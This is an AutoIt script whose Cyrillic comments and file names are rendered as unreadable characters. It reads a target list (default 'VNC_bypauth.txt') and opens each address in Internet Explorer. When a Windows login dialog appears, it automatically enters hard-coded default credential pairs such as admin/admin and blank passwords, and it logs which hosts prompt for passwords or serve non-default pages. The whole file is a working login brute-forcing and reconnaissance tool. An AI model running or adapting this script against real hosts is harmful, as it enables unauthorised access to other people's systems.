#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Outfile=��������_�����������_���_�������_x32.exe
#AutoIt3Wrapper_Outfile_x64=��������_�����������_���_�������_x64.exe
#AutoIt3Wrapper_Compile_Both=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <array.au3>
#include <WinAPI.au3>
#include <ScreenCapture.au3>
#include <IE.au3>
#include <log.au3>
;~ Opt("MustDeclareVars", 1) ; ����������� �������� ����������
HotKeySet("{F7}", "_Exit")
Global $Paused, $oIE, $hLog, $OnlySearch, $sleep, $sleepMin, $sleepLoad, $CountTestPass, $hFileDone, $hFileFindWin, $hFileFindWeb, $aDone, $RestartIE
Local $fileDone, $fileFindWin, $fileFindWeb
$hLog = _Log_Open(@ScriptDir & '\�������������.log', '### ��� ��������� ��������_���_������� ###')
$fileDone = @ScriptDir & '\��������������.txt'
$fileFindWin = @ScriptDir & '\���������_��_������������_����.txt'
$fileFindWeb = @ScriptDir & '\���������_��_html_��������.txt'

$OnlySearch = 0; ������������� � ����� ������ ������
$sleep = 500 ;����������� ����� �������� ����� ����������
$sleepMin = 100 ; ����������� ����� �������� ����� ����������
$sleepLoad = 10000 ;�������� �������� ��������

$CountTestPass = 2
Local $Content, $Strings, $IgnorWordList, $WhiteList, $IgnorRegExpList, $timer, $q = 0, $shet
Global $titleWinPassword, $controlWinLogin, $controlWinPass, $controlWinButtonOK, $controlWinButtonCANCEL, $titleWinList, $aIgnorWordList, $aWhiteList, $aIgnorRegExpList
; ��������� ���� windows c �������� ������
$titleWinPassword = '������������ Windows'
$titleWinList = '������������ Windows|����������� �'
$controlWinLogin = '[CLASS:Edit; INSTANCE:1]'
$controlWinPass = '[CLASS:Edit; INSTANCE:2]'
$controlWinButtonOK = '[CLASS:Button; INSTANCE:2]'
$controlWinButtonCANCEL = '[CLASS:Button; INSTANCE:3]'

$IgnorWordList = 'ErrorPageTemplate|<h1>Welcome to nginx|Apache HTTP Server Test Page|� �������� ����������|>Under construction<|Site is under construction|<h1>It works!</h1>|This is the default web page||If you are the owner of this website, please contact your hosting provider|>Default Web Site Page<|>Welcome to the home of <|>Forbidden<|Apache is functioning normally|' & _
		'���� ��������|>Shared IP<|>There is no site here<|>default.domain<|>400 Bad Request|>401 Unauthorized|>402 Payment Required|>403 Forbidden|>404 Not Found|>405 Method Not Allowed|>406 Not Acceptable|>407 Proxy Authentication Required|>408 Request Timeout|>409 Conflict|>410 Gone|>411 Length Required|>412 Precondition Failed|>413 Request Entity Too Large|>414 Request-URL Too Long|>415 Unsupported Media Type|>416 Requested Range Not Satisfiable|>417 Expectation Failed|>418 I' & "'" & 'm a teapot|>422 Unprocessable Entity|>423 Locked|>424 Failed Dependency|>425 Unordered Collection|>426 Upgrade Required|>428 Precondition Required|>429 Too Many Requests|>431 Request Header Fields Too Large|>434 Requested host unavailable|>449 Retry With|>451 Unavailable For Legal Reasons|>300 Multiple Choices|>301 Moved Permanently|>302 Found|>302 Moved Temporarily|>303 See Other|>304 Not Modified|>305 Use Proxy|>306 (���������������)|>307 Temporary Redirect|>500 Internal Server Error|>501 Not Implemented|>502 Bad Gateway|>503 Service Unavailable|>504 Gateway Timeout|>505 HTTP Version Not Supported|>506 Variant Also Negotiates|>507 Insufficient Storage|>509 Bandwidth Limit Exceeded|>510 Not Extended|>511 Network Authentication Required|>100 Continue|>101 Switching Protocols|>200 OK|>201 Created|>202 Accepted|>203 Non-Authoritative Information|>204 No Content|>205 Reset Content|>206 Partial Content|>408 Request Time-out|>414 Request URL Too Long|>504 Gateway Time-out|>505 HTTP Version not supported'
$aIgnorWordList = StringSplit($IgnorWordList, '|')
$IgnorRegExpList = '(?i)<title>.*?nginx.*?</title>|(?i)<title>.*?nginx.*?</title>|(?i)<title>.*?nginx.*?</title>|(?i)<title>.*?Shared IP.*?</title>|(?i)<title>.*?Apache.*?</title>|(?i)<title>.*?Test Page.*?</title>|(?i)<title>.*?Default.*?</title>|(?i)<title>.*?It works.*?</title>|(?i)<title>.*?Under construction.*?</title>|(?i)<title>.*?� �������� ����������.*?</title>|(?i)<title>.*?default web page.*?</title>|(?i)<title>.*?Default Web Site.*?</title>|(?i)<title>.*?default web.*?</title>|(?i)<title>.*?Welcome to the home.*?</title>|(?i)<title>.*?Welcome to home.*?</title>|(?i)<title>.*?Debian.*?</title>|(?i)<title>.*?Test .*?</title>|(?i)<title>.*?example.*?</title>|(?i)<title>.*?IIS .*?</title>|(?i)<title>.*?lighttpd.*?</title>|(?i)<title>.*?Resin.*?</title>|(?i)<title>.*?Cherokee.*?</title>|(?i)<title>.*?Rootage.*?</title>|(?i)<title>.*?THTTPD.*?</title>|(?i)<title>.*?httpd.*?</title>|(?i)<title>.*?HTTP File Server.*?</title>|(?i)<title>.*?Sambar.*?</title>|(?i)<title>.*?TinyWeb.*?</title>|(?i)<title>.*?Squid.*?</title>|(?i)<title>.*?3proxy.*?</title>|(?i)<title>.*?HandyCache.*?</title>|(?i)<title>.*?UserGate.*?</title>|(?i)<title>.*?no site.*?</title>'
$aIgnorRegExpList = StringSplit($IgnorRegExpList, '|')
$WhiteList = '������ �����������|���������� ������������'
$aWhiteList = StringSplit($WhiteList, '|')

; ��������� ���������� �� ���������� ������
Dim $CmdLineN[2]
If $CmdLine[0] = 1 Then
	$CmdLineN = $CmdLine
Else
	$CmdLineN[0] = 1
	$CmdLineN[1] = @ScriptDir & '\VNC_bypauth.txt'
EndIf

;��������� ������� � �������
local $filePass = @ScriptDir & '\VNC_LoginPass.txt'
if not FileExists($filePass) and $OnlySearch = 0 Then MsgBox(0,' ������',' �� ������ ���� � ��������: '&@CRLF&$filePass)
Local $LoginPass[6][2] = [['admin1', 'admin'], ['admin2', ''], ['admin3', ''], ['admin4', 'admin'], ['admin5', ''], ['admin6', '']]


$Content = FileRead($CmdLineN[1]) ;������ ������� ������ �� �����
$Content = StringReplace(StringReplace(StringReplace(StringReplace($Content, @CRLF, @CR), @LF, @CR), @CR & @CR, @CR), @CR, @CRLF) ;���������� ����� ��� ������� �� ������
$Strings = StringSplit($Content, @CRLF, 1) ;�������� �� ������ � ������
_Log_Report($hLog, '��������� ������� ������: ' & $Strings[0] & @CRLF)

;�������� ��������������� ������
If Not FileExists($fileDone) Then FileWrite($fileDone, '������ ����������� �������:' & @CRLF)
$aDone = StringSplit(FileRead($fileDone), @CRLF)
_ArraySort($aDone, 0, 1)
$hFileDone = FileOpen($fileDone, 1)
$hFileFindWin = FileOpen($fileFindWin, 1)
$hFileFindWeb = FileOpen($fileFindWeb, 1)

_startIE() ; ������ ��������
$shet = 0
For $i = 1 To $Strings[0]
	$timer = TimerInit()
	$RestartIE = 0
	If _ArrayBinarySearch($aDone, $Strings[$i], 1) = -1 Then ; �������� �� ���������� �� ��� ���� �����
		$shet += 1
		_IEStartCheck($Strings[$i]);������ �������� ������ � ��������
		If TimerDiff($timer) > 10 + $sleep Or $shet < 10 Then
			$q = 0
			FileWriteLine($fileDone, $Strings[$i] & @CRLF)
		Else
			If $q > 50 Then _Exit('����� �� ������: ������� ������� ������� ������')
			$q += 1
		EndIf
		Sleep($sleep)
	EndIf
Next

Func _IEStartCheck($address)
	Local $a, $t, $html, $search, $w
	_IENavigate($oIE, $address, 0) ;��������� �� ��������
	For $w = 1 To 4
		$a = _IELoadWait($oIE, 100, $sleepLoad / 4);������� ��������� �������� ��������
		If $a = 1 Then ExitLoop
		If WinExists($titleWinPassword) Then ExitLoop
	Next
	_getHWND()
	If TimerDiff($timer) > $sleepLoad Then $RestartIE = 1
	If WinExists($titleWinPassword) Then _CheckWinPass($address)
	If $RestartIE = 1 Then ;��������� �������� �������� ��������
		$html = _IEDocReadHTML($oIE)
		If StringLen($html) < 100 Then ;�������� ������� �� ������������� ��������
			_IEQuit($oIE)
			Sleep(1000)
			For $i = 1 To 5
				If Not ProcessExists('iexplore.exe') Then ExitLoop
				ProcessClose('iexplore.exe')
				Sleep($sleepMin)
			Next
			Sleep($sleep)
			_startIE() ; ������ ��������
			Return 0
		EndIf
	EndIf

;~ 	ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $a = ' & $a & @CRLF) ;### Debug Console
	$html = _IEDocReadHTML($oIE)
	;����������� ���� �� �� �������� �������
	$search = 1
	For $i = 1 To $aIgnorWordList[0] ;���������� ������������ ������� �� ������
		If StringInStr($html, $aIgnorWordList[$i]) Then
			$search = 0
			ExitLoop
		EndIf
	Next
	For $i = 1 To $aIgnorRegExpList[0] ;���������� ������������ ������� �� ������
		If StringRegExp($html, $aIgnorRegExpList[$i]) Then
			$search = 0
			ExitLoop
		EndIf
	Next
	For $i = 1 To $aWhiteList[0] ; ��������� ������������ ������� � �����, ���� ��� ���� ���������
		If StringInStr($html, $aWhiteList[$i]) Then
			$search = 1
			ExitLoop
		EndIf
	Next

	If $search = 1 And StringLen($html) > 100 Then
		_Log_Report($hLog, '������ ������� �� �����: ' & $address & @CRLF)
		FileWriteLine($hFileFindWeb, $address & @CRLF)
	EndIf
;~ 	ConsoleWrite($html)
EndFunc   ;==>_IEStartCheck

Func _startIE()
	$oIE = _IECreate('about:blank', 0, 0)
	_IEAction($oIE, 'visible')
	Sleep(1000)
EndFunc   ;==>_startIE

Func _CheckWinPass($address)
	Local $a, $t, $c
	_Log_Report($hLog, '������ ������ ������ � ��������� ���� �� �����: ' & $address & @CRLF)
	FileWriteLine($hFileFindWin, $address & @CRLF)
	If $OnlySearch = 1 Then
		;������ ����� � ������������ ��������
		For $c = 1 To 20
;~ 			ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') :  $c = ' & $c & @CRLF) ;### Debug Console
			If WinWait($titleWinPassword, '', 1) = 0 Then ExitLoop
			ControlSend($titleWinPassword, '', $controlWinPass, '{ENTER}') ; Enter
			Sleep($sleepMin)
			ControlClick($titleWinPassword, '', $controlWinButtonCANCEL) ; ���� �� ������ ������
			Sleep($sleep)
		Next
		Return 1
	EndIf

	_getHWND()
	For $p = 0 To UBound($LoginPass) - 1 Step $CountTestPass ; ���� ���� �� ���������� ��� ������
;~ 		ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $p = ' & $p & @CRLF) ;### Debug Console
		If WinWait($titleWinPassword, '', 1) = 0 Then Return 0 ;����� ���� �� ���������� ���� ����� ������
		For $i = 0 To $CountTestPass - 1
			WinActivate($titleWinPassword) ;��������� ����
			ControlSend($titleWinPassword, '', $controlWinLogin, $LoginPass[$p + $i][0]) ;�������� ������
			Sleep($sleepMin)
			ControlSend($titleWinPassword, '', $controlWinPass, '{TAB}') ;���
			Sleep($sleepMin)
			ControlSend($titleWinPassword, '', $controlWinPass, $LoginPass[$p + $i][1]) ;�������� ������
			Sleep($sleepMin)
			ControlSend($titleWinPassword, '', $controlWinPass, '{ENTER}') ; Enter
			Sleep($sleepMin)
		Next
		;������ ����� � ������������ ��������
		For $c = 1 To 10
;~ 			ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') :  $c = ' & $c & @CRLF) ;### Debug Console
			If WinWait($titleWinPassword, '', 1) = 0 Then ExitLoop
			ControlSend($titleWinPassword, '', $controlWinPass, '{ENTER}') ; Enter
			Sleep($sleepMin)
			ControlClick($titleWinPassword, '', $controlWinButtonCANCEL) ; ���� �� ������ ������
			Sleep($sleep)
		Next

		Sleep($sleep)
		If $p > UBound($LoginPass) - 3 Then ContinueLoop
;~ 		ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $address = ' & $address & @CRLF) ;### Debug Console
		_IENavigate($oIE, $address, 0) ;��������� �� ��������
		$a = _IELoadWait($oIE, 500, $sleepLoad);������� ��������� �������� ��������
;~ 		ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $a = ' & $a & @CRLF) ;### Debug Console
		$t = WinWait($titleWinPassword, '', $sleepLoad / 1000)
;~ 		ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $t = ' & $t & @CRLF) ;### Debug Console
		If $t = 0 Then ; ������ �������
			Sleep($sleep)
			_IENavigate($oIE, $address, 0) ;��������� �� ��������
			$a = _IELoadWait($oIE, 500, $sleepLoad);������� ��������� �������� ��������
;~ 			ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $a = ' & $a & @CRLF) ;### Debug Console
			$t = WinWait($titleWinPassword, '', $sleepLoad / 1000)
;~ 			ConsoleWrite('@@ Debug(' & @ScriptLineNumber & ') : $t = ' & $t & @CRLF) ;### Debug Console
		EndIf

	Next

EndFunc   ;==>_CheckWinPass

Func _getHWND() ;������� ��������� ��������� ����
	Local $hwnd, $t
	Opt("WinTitleMatchMode", 1)
	$t = StringSplit($titleWinList, '|')
	For $i = 1 To $t[0]
		If WinExists('[TITLE:' & $t[$i] & '; CLASS:#32770]') Then
			$titleWinPassword = '[TITLE:' & $t[$i] & '; CLASS:#32770]'
			Return $titleWinPassword
		EndIf
	Next
	Return $titleWinPassword
EndFunc   ;==>_getHWND


Func _Exit($msg = '')
	If $msg <> '' Then _Log_Report($hLog, $msg & @CRLF)
	FileClose($hFileDone)
	FileClose($hFileFindWin)
	FileClose($hFileFindWeb)
	Exit
EndFunc   ;==>_Exit


;~ $oIE.Visible=1
;~ $oIE.RegisterAsDropTarget = 1
;~ $oIE.RegisterAsBrowser = 1
;~ $oIE.Navigate( "http://www.AutoItScript.com/" )
